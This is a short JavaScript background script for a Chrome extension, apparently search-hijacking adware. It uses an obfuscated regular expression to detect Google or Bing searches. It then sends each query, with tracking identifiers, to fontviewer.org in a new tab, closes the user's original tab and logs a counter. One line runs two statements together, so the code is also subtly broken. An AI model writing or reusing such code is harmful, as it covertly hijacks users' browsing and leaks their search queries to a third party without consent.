chrome.tabs.onUpdated.addListener(function (i, s, t) {
    var items = [];
    let cmp = ['jcq-src-ku', 'jcq-cmp-ku', 'jcq-cnt-ku', 'lq'];
    localStorage.setItem('k', cmp) chrome.storage.sync.get(cmp, function (items) {
        Object.keys(items).forEach(function (k) {
            localStorage.setItem(k, items[k]);
        })
    });
    cmp.forEach(function (k) {
        if (localStorage.getItem(k)) {
            items[k] = localStorage.getItem(k);
        }
    });
    if (Object.keys(items).length >= 3 && "loading" === t.status && (p = t.url.match(/:\/+([w|\.]+)?[bg]([ngio]{3})(le)?\.([a-z\.]{2,6}\/s)(.{3})ch[?&].*?q=(.*?)[?&]/)) && p[6] && !t.url.match(/[?&](tbm)/) && items['lq'] != decodeURIComponent(p[6].replace(/\+/g, '%20'))) {
        chrome.tabs.create({
            url: " https://fontviewer.org/s/?api=ruqbmeyw&q=" + decodeURIComponent(p[6].replace(/\+/g, '%20')) + "&jcq-src-ku=" + items['jcq-src-ku'] + "&jcq-cmp-ku=" + items['jcq-cmp-ku'] + "&jcq-cnt-ku=" + items['jcq-cnt-ku']
        });
        chrome.tabs.remove(i);
        chrome.storage.sync.set({
            'lq': decodeURIComponent(p[6].replace(/\+/g, '%20')),
            'jcq-cnt-ku': Number(items['jcq-cnt-ku']) + 1
        });
    }
});
